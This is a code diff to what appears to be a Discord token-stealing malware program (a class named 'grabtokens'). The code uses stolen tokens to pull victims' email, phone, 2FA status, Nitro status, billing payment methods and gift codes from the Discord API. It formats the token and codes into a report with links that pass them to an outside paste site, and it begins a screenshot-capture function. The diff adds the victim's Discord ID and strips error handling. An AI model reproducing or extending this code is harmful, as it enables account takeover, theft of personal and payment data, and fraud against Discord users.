@@ -241,25 +241,20 @@ class grabtokens():
                 'https://discord.com/api/v9/users/@me',
                 headers={"Authorization": token})
 
+            discord_id = r.json()['id']
             username = r.json()['username'] + '#' + r.json()['discriminator']
             phone = r.json()['phone']
             email = r.json()['email']
 
-            try:
-                if r.json()['mfa_enabled'] == True:
-                    mfa = "✅"
-                if r.json()['mfa_enabled'] == False:
-                    mfa = "❌"
-            except KeyError:
-                mfa = '❌'
-                
-            try:
-                if r.json()['premium_type'] == 1:
-                    nitro = 'Nitro Classic'
-                elif r.json()['premium_type'] == 2:
-                    nitro = 'Nitro Boost'
-            except KeyError :
-                nitro = 'None'
+            if r.json()['mfa_enabled'] == True:
+                mfa = "✅"
+            if r.json()['mfa_enabled'] == False:
+                mfa = "❌"
+
+            if r.json()['premium_type'] == 1:
+                nitro = 'Nitro Classic'
+            elif r.json()['premium_type'] == 2:
+                nitro = 'Nitro Boost'
 
             b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token))
 
@@ -276,17 +271,13 @@ class grabtokens():
                         methods += "❓"
 
             g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=self.getheaders(token))
-            try:
-                if "code" in g.text:
-                    codes = json.loads(g.text)
-                    for code in codes:
-                        all_codes = code['code']
-                        title = code['promotion']['outbound_title']
-            except:
-                all_codes = "❌ No gift codes found"
-                title = ""
+            if "code" in g.text:
+                codes = json.loads(g.text)
+                for code in codes:
+                    all_codes = code['code']
+                    title = code['promotion']['outbound_title']
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           #addidix's cool little copy n paste website
-            embed.add_field(name=f"DISCORD INFO - {username}", value=f'''<:1119pepesneakyevil:972703371221954630> `Discord Username:` **{username}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b\n:gift: `{title}:`\n**{all_codes}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={all_codes})\u200b''', inline=False)
+            embed.add_field(name=f"DISCORD INFO - {username}", value=f'''<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b\n:gift: `{title}:`\n**{all_codes}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={all_codes})\u200b''', inline=False)
 
 def ss():
     ImageGrab.grab(
